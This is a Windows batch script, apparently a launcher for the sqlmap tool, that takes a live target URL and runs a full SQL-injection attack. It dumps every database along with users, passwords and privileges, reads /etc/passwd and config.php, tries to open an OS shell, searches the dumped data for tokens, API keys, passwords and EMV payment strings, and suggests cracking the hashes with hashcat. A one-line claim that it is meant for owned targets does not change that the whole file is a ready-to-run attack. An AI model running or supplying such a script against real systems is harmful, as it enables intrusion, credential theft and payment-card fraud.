@echo off
:: Dracula's SQLMap Launcher (LIVE TARGET EDITION)
:: --------------------------------------------------
:: This version is for scanning LIVE targets that you own or control.
:: It allows you to change targets easily without needing a local vuln app.

:: === ENTER YOUR LIVE TARGET URL HERE ===
:: Example: https://yourdomain.com/path/to/page.php?id=1
set /p TARGET=Enter your live target URL (e.g. https://site.com/page.php?id=1):

:: === CONFIGURATION ===
set SQLMAP_PATH=sqlmap\sqlmap.py

:: === PHASE 1: FULL SQLMap ATTACK ===
echo [*] Executing SQLMap scan against %TARGET% ...
python %SQLMAP_PATH% -u "%TARGET%" ^
  --batch ^
  --level=5 ^
  --risk=3 ^
  --technique=BEUSTQ ^
  --threads=10 ^
  --fresh-queries ^
  --dump-all ^
  --passwords ^
  --users ^
  --privileges ^
  --roles ^
  --dbs ^
  --columns ^
  --answers="follow=Y"

:: === PHASE 2: FILE READ ATTEMPT (Optional for Remote Linux Targets) ===
echo [*] Trying to read common server files (if accessible)...
python %SQLMAP_PATH% -u "%TARGET%" --file-read=/etc/passwd
python %SQLMAP_PATH% -u "%TARGET%" --file-read=/var/www/html/config.php

:: === PHASE 3: OS SHELL ATTEMPT (If exploitable) ===
echo [*] Trying to open OS shell on target (if allowed)...
python %SQLMAP_PATH% -u "%TARGET%" --os-shell

:: === PHASE 4: SCAN OUTPUT FOR SENSITIVE DATA ===
echo [*] Scanning dump output for tokens, passwords, and EMV strings...
findstr /i "token api_key secret password emv" sqlmap\output\*\dump\*.* > extracted_findings.txt

:: === PHASE 5: HASHCRACKING PREP (Manual) ===
echo [*] If you saved password hashes, crack them with hashcat:
echo Example: hashcat -m 0 hashdump.txt rockyou.txt

:: === END ===
echo [*] Scan complete. Review extracted_findings.txt and sqlmap\output folder.
pause
